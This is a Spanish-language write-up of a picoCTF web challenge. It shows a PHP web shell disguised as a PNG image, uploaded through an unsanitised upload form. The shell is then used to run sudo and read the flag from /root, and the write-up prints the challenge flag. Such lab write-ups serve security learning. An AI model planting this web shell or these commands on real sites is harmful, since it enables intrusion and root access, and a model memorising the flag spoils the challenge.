A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.
You can access the web application [here](http://standard-pizzas.picoctf.net:55973/)!

Hints:
1. File upload was not sanitized
2. Whenever you get a shell on a remote machine, check `sudo -l`

## Solución:
Como en la descripción me indica que debo encontrar la flag en un directorio, use un script de php camuflado de imagen PNG para tener una webshell
El script es:
```
┌──(kali㉿kali)-[~/Documents]
└─$ cat flag.png.php 
PNG
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
Con este directamente puse el comando sudo -l para saber que podía hacer con root, indicándome que podía hacer todo sin solicitarme contraseña:
```
URL: http://standard-pizzas.picoctf.net:56052/uploads/flag.png.php?cmd=sudo%20-l
Respuesta: User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```
Al enterarme de esto, directamente revise lo que habia en el directorio /root/ para saber que archivos revisar:
```
URL: http://standard-pizzas.picoctf.net:56052/uploads/flag.png.php?cmd=sudo%20ls%20/root/
Respuesta: flag.txt
```
Con esto toca simplemente revisar el archivo:
```
URL: http://standard-pizzas.picoctf.net:56052/uploads/flag.png.php?cmd=sudo%20cat%20/root/flag.txt
Respuesta: picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}
```